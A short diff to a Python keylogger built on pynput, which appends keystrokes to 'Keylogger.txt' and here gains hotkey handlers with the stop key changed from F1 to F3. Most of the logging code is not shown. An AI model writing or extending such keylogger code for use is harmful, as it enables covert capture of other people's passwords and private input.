@@ -1,6 +1,17 @@
 from pynput.keyboard import Key
 
 
+def hot_down(key):
+    pass
+
+
+def hot_up(key):
+    if key == Key.f3:  # Hotkey to end process
+        return False
+
+
+
+
 def key_down(key):
     log = open('Keylogger.txt', mode='a')
     try:
@@ -21,5 +32,5 @@ def key_down(key):
 
 
 def key_up(key):
-    if key == Key.f1:  # Hotkey to end process
+    if key == Key.f3:  # Hotkey to end process
         return False
